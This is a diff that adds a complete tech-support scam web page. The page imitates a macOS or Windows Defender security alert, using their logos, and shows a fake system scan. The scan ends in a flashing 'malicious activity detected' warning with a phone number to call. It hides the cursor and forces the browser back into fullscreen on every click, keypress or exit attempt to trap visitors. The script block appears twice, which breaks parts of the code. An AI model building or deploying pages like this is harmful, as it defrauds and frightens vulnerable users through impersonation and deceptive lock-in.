@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Alert</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            overflow: hidden;
+            cursor: none;
+            color: white;
+            height: 100vh;
+        }
+
+        /* Windows Theme */
+        .windows-theme {
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)),
+                        url('https://cdn.wallpapersafari.com/61/92/CFM4u2.jpg') center/cover;
+        }
+        
+        /* Mac Theme */
+        .mac-theme {
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
+                        url('https://images.unsplash.com/photo-1531297484001-80022131f5a1') center/cover;
+        }
+
+        /* Flashing Emergency Number */
+        .emergency-number {
+            display: none;
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 2.5em;
+            color: #ff0000;
+            text-shadow: 0 0 15px rgba(255,0,0,0.7);
+            animation: emergencyFlash 0.8s infinite;
+            z-index: 1000;
+        }
+
+        @keyframes emergencyFlash {
+            0%, 100% { opacity: 1; transform: translateX(-50%) scale(1.1); }
+            50% { opacity: 0.3; transform: translateX(-50%) scale(0.9); }
+        }
+
+        /* Scan Container */
+        .scan-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.9);
+            padding: 30px;
+            border-radius: 15px;
+            width: 600px;
+            backdrop-filter: blur(10px);
+            border: 2px solid #ffffff30;
+        }
+
+        /* OS Logo */
+        .os-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 130px;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            height: 25px;
+            background: #222;
+            border-radius: 5px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #00ff00;
+            transition: width 0.5s;
+        }
+
+        /* Warning Message */
+        .warning-message {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: rgba(255,0,0,0.15);
+            padding: 20px;
+            border-top: 3px solid red;
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body>
+    <img src="" class="os-logo" alt="OS Logo">
+    <div class="emergency-number">+1 800 900 9999</div>
+
+    <div class="scan-container">
+        <h1 id="scan-title">System Security Scan</h1>
+        <p id="scan-status">Initializing security protocols...</p>
+        <button id="start-scan" class="scan-button">Start System Scan</button>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+    </div>
+
+    <div class="warning-message">
+        ⚠ CRITICAL ALERT! Malicious activity detected!<br>
+        Call support immediately at the flashing number above!
+    </div>
+
+    <script>
+        // Configuration
+        let forceMacMode = true; // Set to true to force Mac version
+        
+        // Detect environment
+        const isMac = navigator.platform.toLowerCase().includes('mac');
+        const isWindows = navigator.platform.toLowerCase().includes('win');
+        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+        // Apply OS theme
+        function applyOSTheme() {
+            if (forceMacMode || isMac || isSafari) {
+                $('body').addClass('mac-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg');
+                $('#scan-title').text('macOS Security Alert');
+            } else {
+                $('body').addClass('windows-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg');
+                $('#scan-title').text('Windows Defender Alert');
+            }
+        }
+
+        // Fullscreen management
+        function enforceFullscreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            }
+        }
+
+        // Scan functionality
+        $('#start-scan').click(function() {
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                $('.progress-fill').css('width', `${progress}%`);
+                $('#scan-status').text(`Scanning system files... ${progress}% complete`);
+                
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    $('.emergency-number, .warning-message').fadeIn(500);
+                }
+            }, 800);
+        });
+
+        // Event listeners
+        $(document)
+            .on('click keydown', enforceFullscreen)
+            .on('fullscreenchange', enforceFullscreen);
+
+        // Initial setup
+        applyOSTheme();
+        enforceFullscreen();
+    </script>
+	<script>
+        // Configuration
+        let forceMacMode = true; // Set to true to force Mac version
+        
+        // Detect environment
+        const isMac = navigator.platform.toLowerCase().includes('mac');
+        const isWindows = navigator.platform.toLowerCase().includes('win');
+        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+        // Apply OS theme
+        function applyOSTheme() {
+            if (forceMacMode || isMac || isSafari) {
+                $('body').addClass('mac-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg');
+                $('#scan-title').text('macOS Security Alert');
+            } else {
+                $('body').addClass('windows-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg');
+                $('#scan-title').text('Windows Defender Alert');
+            }
+        }
+
+        // Fullscreen management
+        function enforceFullscreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            }
+        }
+
+        // Scan functionality
+        $('#start-scan').click(function() {
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                $('.progress-fill').css('width', `${progress}%`);
+                $('#scan-status').text(`Scanning system files... ${progress}% complete`);
+                
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    $('.emergency-number, .warning-message').fadeIn(500);
+                }
+            }, 800);
+        });
+
+        // Event listeners
+        $(document)
+            .on('click keydown', enforceFullscreen)
+            .on('fullscreenchange', enforceFullscreen);
+
+        // Initial setup
+        applyOSTheme();
+        enforceFullscreen();
+    </script>
+</body>
+</html>
